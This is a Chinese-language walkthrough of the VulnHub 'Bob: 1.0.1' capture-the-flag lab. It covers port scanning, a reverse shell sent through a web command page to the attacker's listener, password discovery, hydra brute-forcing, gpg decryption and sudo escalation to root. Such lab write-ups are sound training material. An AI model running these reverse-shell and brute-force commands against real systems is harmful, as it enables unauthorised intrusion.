# Bob: 1.0.1

2025.03.01 https://www.vulnhub.com/entry/bob-101,226/

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
80/tcp    open  http
25468/tcp open  unknown
```

先看 80 扫描到 http://192.168.5.40/robots.txt：

```
Disallow: /login.php
Disallow: /dev_shell.php
Disallow: /lat_memo.html
Disallow: /passwords.html
```

挨个看一下，login.php 访问是 404，dev_shell.php 显示了一个执行命令的页面，可以执行命令，进行反弹 shell 到 kali 上：

```
nc -lvnp 8888
curl --data-urlencode 'in_command=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.40/dev_shell.php
```

读取到提示，寻找隐藏文件：

```
www-data@Milburg-High:/var/www/html$ cat .hint
Have you tried spawning a tty shell?
Also don't forget to check for hidden files ;)
```

进行枚举，发现这个用户的目录下有文件：

```
www-data@Milburg-High:/home/elliot$ cat theadminisdumb.txt
The admin is dumb,
In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of time before it’s broken into so because of this I have changed my password to

theadminisdumb

I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.
```

提到 2 个密码 Qwerty 和 theadminisdumb ，发现了几个用户 bob、elliot、jc、seb ，进行 hydra 测试，发现 elliot 密码是 theadminisdumb ， jc 的密码是 Qwerty

在 bob 目录中又发现了密码提示：

```
jc@Milburg-High:/home/bob$ cat .old_passwordfile.html
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>
```

但是这些密码都没什么用，其他的提权方式都没有。

在看 bob 目录中，发现一个 notes 文件：

```
seb@Milburg-High:/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ cat notes.sh
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
```

里面没看出什么信息，首字母都大写，把信息提取出来 HARPOCRATES ，在 Documents 中发现了一个 login.txt.gpg 文件，需要进行解密：

```
gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
```

得到密码 `bob:b0bcat_` 切换到 bob 用户，sudo -l 显示 ALL，拿下了 root 权限。
